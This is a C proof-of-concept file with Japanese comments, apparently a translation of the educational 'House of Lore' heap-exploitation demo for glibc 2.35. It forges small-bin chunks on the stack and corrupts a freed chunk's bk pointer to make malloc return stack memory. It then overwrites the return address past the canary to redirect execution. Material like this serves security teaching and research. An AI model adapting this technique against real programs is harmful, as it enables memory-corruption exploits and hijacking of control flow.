/*
House of Lore の高度な悪用 - Malloc Maleficarum。
この PoC は、small bin の破壊に対する glibc の強化策にも対処しています。

[ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "ナイスジャンプ!\n"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[4] = {0};
  void* fake_freelist[7][4];

  fprintf(stderr, "\nHouse of Lore へようこそ\n");
  fprintf(stderr, "これは、glibc malloc に導入された強化チェックも回避する、再訪版です\n");
  fprintf(stderr, "Ubuntu 22.04 - 64bit - glibc-2.35 でテストしています\n\n");

  fprintf(stderr, "victim チャンクを確保します\n");
  intptr_t *victim = malloc(0x100);
  fprintf(stderr, "ヒープ上の %p に、最初の small チャンクを確保しました\n", victim);

  fprintf(stderr, "後で tcache を使い切るために、ダミーのチャンクを確保します\n");
  void *dummies[7];
  for(int i=0; i<7; i++) dummies[i] = malloc(0x100);

  // チャンクの絶対アドレスを得るにはヘッダのサイズを取り除く必要があるため、victim-WORD_SIZE とします
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 は %p にあります\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 は %p にあります\n", (void*)stack_buffer_2);

  fprintf(stderr, "スタック上に偽のfree list を作ります\n");
  for(int i=0; i<6; i++) {
    fake_freelist[i][3] = fake_freelist[i+1];
  }
  fake_freelist[6][3] = NULL;
  fprintf(stderr, "偽のfree listは %p にあります\n", fake_freelist);

  fprintf(stderr, "スタック上に偽チャンクを作ります\n");
  fprintf(stderr, "small bin 破壊のチェックを回避するために、fwd ポインタを victim_chunk に設定します。"
         "これは最後から 2 番目の malloc で、スタックのアドレスを small bin のリストに載せるときのチェックです\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "bk ポインタを stack_buffer_2 に設定し、stack_buffer_2 の fwd ポインタが stack_buffer_1 を指すように設定します。"
         "これは、スタック上の偽チャンクへのポインタを返す最後の malloc での、small bin 破壊のチェックを回避するためです");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, "small bin から tcache への移動の仕組みによって生じるクラッシュを防ぐために、"
          "stack_buffer_2 の bck ポインタを偽のfree listに設定します\n");
  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
  
  fprintf(stderr, "free() の際に top chunkが small チャンクと併合されるのを避けるために、"
         "別の large チャンクを確保します\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "ヒープ上の %p に large チャンクを確保しました\n", p5);


  fprintf(stderr, "ダミーのチャンクを解放します\n");
  for(int i=0; i<7; i++) free(dummies[i]);
  fprintf(stderr, "チャンク %p を解放します。unsorted bin に挿入されます\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nunsorted bin 内では、victim の fwd と bk のポインタは unsorted bin のヘッダのアドレス (libc のアドレス) です\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "ここで、UnsortedBin でも small bin でも処理できない malloc を行います\n");
  fprintf(stderr, "つまり、チャンク %p は SmallBin の先頭に挿入されます\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "unsorted bin でも SmallBin でも処理できなかったチャンクが %p に確保されました\n", p2);

  fprintf(stderr, "victim チャンクは整理 (sort) され、fwd と bk のポインタが更新されました\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------脆弱性-----------

  fprintf(stderr, "ここで、victim->bk ポインタを上書きできる脆弱性を模擬します\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk がスタックを指します

  //------------------------------------
  fprintf(stderr, "tcache 内のダミーのチャンクをすべて取り出します\n");
  for(int i=0; i<7; i++) malloc(0x100);


  fprintf(stderr, "ここで、最初に解放したチャンクと同じサイズのチャンクを確保します\n");
  fprintf(stderr, "これは、上書きされた victim チャンクを返し、bin->bk を注入した victim->bk ポインタに設定するはずです\n");

  void *p3 = malloc(0x100);

  fprintf(stderr, "この最後の malloc で、glibc の malloc をだまして、bin->bk に注入した位置のチャンクを返させます\n");
  char *p4 = malloc(0x100);
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\n最後の malloc のあと、stack_buffer_2 の fwd ポインタは %p に変わりました\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 は %p で、スタック上にあるはずです!\n", p4); // このチャンクはスタック上に確保されます
  intptr_t sc = (intptr_t)jackpot; // メモリ上のシェルコードを模擬します

  long offset = (long)__builtin_frame_address(0) - (long)p4;
  memcpy((p4+offset+8), &sc, 8); // カナリアを飛び越えるので、スタック破壊の検出を回避できます

  // 確認用のチェック
  assert((long)__builtin_return_address(0) == (long)jackpot);
}
